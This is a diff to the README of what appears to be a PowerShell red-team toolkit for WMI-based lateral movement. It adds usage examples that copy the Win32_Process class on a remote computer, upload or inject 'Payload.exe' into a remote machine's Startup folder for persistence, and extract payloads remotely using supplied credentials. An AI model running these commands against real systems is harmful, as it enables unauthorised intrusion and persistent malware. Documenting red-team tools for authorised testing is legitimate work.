@@ -10,11 +10,17 @@ Primarily used in conjunction with WheresMyImplant - https://github.com/0xbadjuj
 ### Methods
 * **Class Duplication**
   * Invoke-WMIDuplicateClass
+    * Invoke-WMIDuplicateClass -TargetClassName Win32_Process -DuplicateClassName Win32_Create -ComputerName $ComputerName -Credential $Credential
 
 * **File Transfer**
   * Invoke-WMIUpload
+    * $Destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+    * Invoke-WMIUpload -PayloadPath C:\Payload.exe -Destination $Destination -PayloadName Payload.exe -ComputerName  $ComputerName -Credential $Credential
+    * Invoke-WMIUpload -PayloadPath C:\Payload.exe -Inject -PayloadName Payload.exe -ComputerName  $ComputerName -Credential $Credential
   * Invoke-WMIRemoteExtract
-  
+    * $Destination = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+    * Invoke-WMIRemoteExtract -PayloadName Payload.exe -Destination $Destination -ComputerName  $ComputerName -Credential $Credential
+
 * **File Storage**
   * New-WMIFSClass
   * ConvertTo-Base64
